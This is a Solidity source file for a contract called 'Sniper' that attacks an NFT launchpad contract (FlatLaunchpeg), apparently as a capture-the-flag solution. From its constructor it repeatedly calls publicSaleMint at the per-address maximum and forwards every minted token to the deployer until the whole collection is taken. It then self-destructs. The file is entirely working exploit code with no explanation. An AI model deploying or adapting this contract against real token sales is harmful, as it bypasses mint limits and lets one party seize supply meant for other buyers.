// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IFlatLaunchpeg {
    function collectionSize() external view returns(uint256);
    function maxPerAddressDuringMint() external view returns(uint256);
    function publicSaleMint(uint256 _quantity) external payable;
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

contract Sniper {
    IFlatLaunchpeg private nft;
    address private owner;    

    event Count(uint256 cnt);

    constructor(address flatLaunchpeg) payable {
        owner = msg.sender;
        nft = IFlatLaunchpeg(flatLaunchpeg);
        mint();
        selfdestruct(payable(owner));
    }

    function mint() private {
        uint256 maxMint = nft.maxPerAddressDuringMint();
        uint256 collectionSize = nft.collectionSize();
        uint256 i;
        uint256 currentId;
        uint256 count;
        for (; i < collectionSize;) {
            if (i + maxMint > collectionSize)
                break;
            currentId = i;
            count = maxMint;
            nft.publicSaleMint{value: address(this).balance}(maxMint);
            for (uint256 j; j < count; ++j) {
                nft.transferFrom(address(this), owner, currentId + j);
            }     
            i += maxMint;
        }
        if (i < collectionSize) {
            currentId = i;
            count = collectionSize - i;
            nft.publicSaleMint{value: address(this).balance}(count);
            for (uint256 j; j < count; ++j) {
                nft.transferFrom(address(this), owner, currentId + j);
            }
        }
    }

    fallback() external payable {}
}